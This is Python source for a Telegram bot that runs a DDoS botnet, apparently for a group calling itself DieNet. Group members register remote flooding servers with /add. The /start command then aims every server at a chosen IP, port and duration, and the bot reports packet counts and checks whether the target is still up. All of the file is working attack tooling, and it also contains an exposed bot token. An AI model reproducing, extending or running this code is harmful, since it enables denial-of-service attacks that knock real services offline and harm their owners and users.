import re
import asyncio
import aiohttp
import telebot
from telebot import types
import time

TOKEN = '7998166097:AAGDDQGfFRC50GQ2ORPsbnZ0u3qp8p7tgMY'
bot = telebot.TeleBot(TOKEN)

attack_in_progress = False
attack_end_time = 0
cooldown_end_time = 0
ALLOWED_CHAT_ID = -4647973707

def load_urls_from_file():
    try:
        with open('servers.txt', 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        return []

def save_url_to_file(url):
    with open('servers.txt', 'a') as file:
        file.write(url + '\n')

def format_number(number, is_mb=False):
    if is_mb:
        if number >= 1_000_000:
            return f"{number / 1_000_000:.2f}TB"
        elif number >= 1_000:
            return f"{number / 1_000:.2f}GB"
        else:
            return f"{number:.2f}MB"
    else:
        if number >= 1_000_000_000_000:
            return f"{number / 1_000_000_000_000:.2f}T"
        elif number >= 1_000_000_000:
            return f"{number / 1_000_000_000:.2f}G"
        elif number >= 1_000_000:
            return f"{number / 1_000_000:.2f}M"
        elif number >= 1_000:
            return f"{number / 1_000:.2f}K"
        else:
            return str(number)

def create_check_host_url(ip, port):
    if port in ['80', '443']:
        protocol = 'https' if port == '443' else 'http'
        return f"https://check-host.net/check-http?host={protocol}://{ip}"
    else:
        return f"https://check-host.net/check-http?host={ip}:{port}"

async def verify_url(session, url):
    try:
        async with session.get(url, timeout=10) as response:
            if response.status == 200:
                text = await response.text()
                if "Usage: ?host=&port=&time=" in text and "Example: ?host=192.168.1.1&port=53&time=60" in text:
                    return "verified"
                return "incorrect"
            return "not_working"
    except:
        return "not_working"

async def get_report_url(check_host_url):
    async with aiohttp.ClientSession() as session:
        for attempt in range(3):
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                }
                async with session.get(check_host_url, headers=headers, timeout=10) as response:
                    if response.status == 200:
                        html_content = await response.text()
                        report_match = re.search(r'href=["\']?(https://check-host\.net/check-report/[a-zA-Z0-9]+)["\']?', html_content)
                        return report_match.group(1) if report_match else None
            except:
                await asyncio.sleep(2)
        return None

async def fetch(session, url, ip, port, current_time):
    formatted_url = url.format(ip=ip, port=port, time=current_time)
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        async with session.get(formatted_url, headers=headers, timeout=30) as response:
            if response.status == 200:
                response_text = await response.text()
                if "<script>" in response_text or "<noscript>" in response_text:
                    return 0, 0, 0, False
                packets_match = re.search(r'(\d+) packets sent', response_text)
                mb_match = re.search(r'(\d+\.\d+) MB of data', response_text)
                packets_per_sec_match = re.search(r'(\d+\.?\d*) packets/sec', response_text)
                if packets_match and mb_match and packets_per_sec_match:
                    return int(packets_match.group(1)), float(mb_match.group(1)), float(packets_per_sec_match.group(1)), True
                return 0, 0, 0, False
            return 0, 0, 0, False
    except:
        return 0, 0, 0, False

async def run_attack(ip, port, time_sec, message):
    global attack_in_progress, attack_end_time, cooldown_end_time
    URLS = load_urls_from_file()
    max_time_per_request = 30
    wait_between_requests = 10
    total_packets = 0
    total_mb = 0
    total_packets_per_sec = 0
    total_requests = 0

    attack_end_time = time.time() + time_sec
    attack_in_progress = True

    check_host_url = create_check_host_url(ip, port)
    markup = types.InlineKeyboardMarkup()
    check_button = types.InlineKeyboardButton("🚀 Check Host", url=check_host_url)
    markup.add(check_button)

    msg = bot.reply_to(
        message,
        "<blockquote>🎲 IP/Domain: {}\n"
        "🎲 Port: {}\n"
        "🎲 TIME: {} Sec</blockquote>\n\n"
        "⚠️ The botnet has started the attack. Please do not send any more attacks until this attack is over.".format(ip, port, time_sec),
        parse_mode='HTML',
        reply_markup=markup
    )

    remaining_time = time_sec
    while remaining_time > 0:
        current_time = min(remaining_time, max_time_per_request)
        remaining_time -= current_time

        async with aiohttp.ClientSession() as session:
            tasks = [fetch(session, url, ip, port, current_time) for url in URLS]
            results = await asyncio.gather(*tasks)

            working_count = 0
            not_working_count = 0
            for packets, mb, packets_per_sec, is_working in results:
                total_packets += packets
                total_mb += mb
                total_packets_per_sec += packets_per_sec
                if is_working:
                    working_count += 1
                else:
                    not_working_count += 1

        total_requests += len(URLS)

        report_url = await get_report_url(check_host_url)
        markup = types.InlineKeyboardMarkup(row_width=2)
        check_button = types.InlineKeyboardButton("🚀 Check Host", url=check_host_url)
        if report_url:
            report_button = types.InlineKeyboardButton("🚀 Get Report", url=report_url)
            markup.add(check_button, report_button)
        else:
            markup.add(check_button)

        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text="<blockquote>🎲 IP/Domain: {}\n"
                 "🎲 Port: {}\n"
                 "🎲 TIME: {} Sec</blockquote>\n\n"
                 "⚠️ The botnet is attacking...\n\n"
                 "<blockquote>📈 Current Statistics:\n"
                 "• Total Packets: {}\n"
                 "• Packets per/sec: {}\n"
                 "• Total MB: {}\n"
                 "• Not working: {}\n"
                 "• In working: {}</blockquote>".format(ip, port, remaining_time, format_number(total_packets), format_number(total_packets_per_sec), format_number(total_mb, is_mb=True), not_working_count, working_count),
            parse_mode='HTML',
            reply_markup=markup
        )

        await asyncio.sleep(wait_between_requests if remaining_time > 0 else 0)

    report_url = await get_report_url(check_host_url)
    markup = types.InlineKeyboardMarkup(row_width=2)
    check_button = types.InlineKeyboardButton("🚀 Check Host", url=check_host_url)
    if report_url:
        report_button = types.InlineKeyboardButton("🚀 Get Report", url=report_url)
        markup.add(check_button, report_button)
    else:
        markup.add(check_button)

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=msg.message_id,
        text="⚠️ Attack is over ⚠️\n\n"
             "<blockquote>📈 Final Statistics:\n"
             "• Total requests: {}\n"
             "• Total Packets: {}\n"
             "• Packets per/sec: {}\n"
             "• Total MB: {}\n"
             "• Not working: {}\n"
             "• In working: {}</blockquote>".format(total_requests, format_number(total_packets), format_number(total_packets_per_sec), format_number(total_mb, is_mb=True), not_working_count, working_count),
        parse_mode='HTML',
        reply_markup=markup
    )

    attack_in_progress = False
    attack_end_time = 0
    cooldown_end_time = time.time() + 30

@bot.message_handler(commands=['add'])
async def handle_add(message):
    if message.chat.id != ALLOWED_CHAT_ID:
        bot.reply_to(message, "⚠️ This is a private server that only operates within the DieNet group.")
        return

    urls = re.findall(r'https?://[^\s]+', message.text)
    if not urls:
        bot.reply_to(message, "⚠️ Please provide at least one URL with the /add command")
        return

    initial_msg = bot.reply_to(message, f"{len(urls)}🚀 Server is being added")
    
    verified = 0
    incorrect = 0
    not_working = 0
    
    async with aiohttp.ClientSession() as session:
        tasks = [verify_url(session, url) for url in urls]
        results = await asyncio.gather(*tasks)
        
        for url, result in zip(urls, results):
            if result == "verified":
                save_url_to_file(url)
                verified += 1
            elif result == "incorrect":
                incorrect += 1
            else:
                not_working += 1

    result_text = (
        f"{len(urls)}🚀 Server is being added\n\n"
        f"✅ Verified: {verified}\n"
        f"📛 incorrect: {incorrect}\n"
        f"🚫 Not working: {not_working}\n\n"
        "⚠️Do not send any more commands until the bot has finished scanning."
    )
    
    final_msg = bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=initial_msg.message_id,
        text=result_text
    )
    
    await asyncio.sleep(20)
    bot.delete_message(chat_id=message.chat.id, message_id=final_msg.message_id)

@bot.message_handler(commands=['start'])
def handle_start(message):
    global attack_in_progress, attack_end_time, cooldown_end_time
    
    if message.chat.id != ALLOWED_CHAT_ID:
        bot.reply_to(message, "⚠️ This is a private server that only operates within the DieNet group.")
        return

    message_text = message.text
    match = re.match(r'/start (\S+) (\d+) (\d+)', message_text)
    
    if not match:
        bot.reply_to(message, "⚠️ Incorrect format. Please use: /start {ip or domain} {port} {time sec}")
        return
    
    ip, port, time_sec = match.groups()
    time_sec = int(time_sec)

    if attack_in_progress:
        remaining_seconds = max(0, int(attack_end_time - time.time()))
        bot.reply_to(message, f"⚠️ An attack is already in progress. Please wait {remaining_seconds} seconds.")
        return
    
    current_time = time.time()
    if cooldown_end_time > current_time:
        remaining_cooldown = max(0, int(cooldown_end_time - current_time))
        bot.reply_to(message, f"⚠️ Please wait {remaining_cooldown} seconds before starting a new attack.")
        return

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_attack(ip, port, time_sec, message))

if __name__ == '__main__':
    print("Bot is running...")
    bot.polling(none_stop=True)
